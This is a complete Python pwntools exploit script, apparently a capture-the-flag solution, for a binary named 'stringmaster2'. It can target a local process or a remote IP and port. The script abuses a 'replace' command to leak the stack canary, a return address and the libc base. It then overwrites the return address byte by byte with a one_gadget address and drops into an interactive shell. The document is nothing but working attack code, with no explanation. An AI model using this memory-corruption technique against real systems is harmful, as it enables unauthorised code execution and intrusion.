#!/usr/bin/env python

from pwn import *

if (sys.argv[1] == "local"):
	r = process("./stringmaster2")
else:
	r = remote("35.207.132.47", 22225)

one_gadget_off = 0x10a38c

r.recvuntil("quit")
r.recvuntil("quit")
r.recvuntil("> ") 
r.sendline("replace " + "\x00" + "A")

r.recvuntil("quit")
r.recvuntil("> ")
r.sendline("print")
r.recv(7*8)
canary = u64(r.recv(8))
log.info("canary: %s" % hex(canary))
r.recv(7*8)
ret = u64(r.recv(8))
log.info("ret: %s" % hex(ret))
r.recv(8)
base_libc = u64(r.recv(8)) - 0x21b97
log.info("base_libc: %s" % hex(base_libc))
one_gadget = base_libc + one_gadget_off
log.info("one_gadget: %s" % hex(one_gadget))

for i in range(6):
    r.sendline("replace " + chr(ret >> 40) + chr(one_gadget >> 40))

for i in range(6):
    r.sendline("replace " + chr((ret >> 32) & 0xff) + chr((one_gadget >> 32) & 0xff))

for i in range(4):
    r.sendline("replace " + chr((ret >> 24) & 0xff)+ chr((one_gadget >> 24) & 0xff))

for i in range(4):
    r.sendline("replace " + chr((ret >> 16) & 0xff)+ chr((one_gadget >> 16) & 0xff))

for i in range(1):
    r.sendline("replace " + chr((ret >> 8) & 0xff)+ chr((one_gadget >> 8) & 0xff))

for i in range(1):
    r.sendline("replace " + chr(ret & 0xff) + chr(one_gadget & 0xff))

r.sendline("quit")
r.interactive()
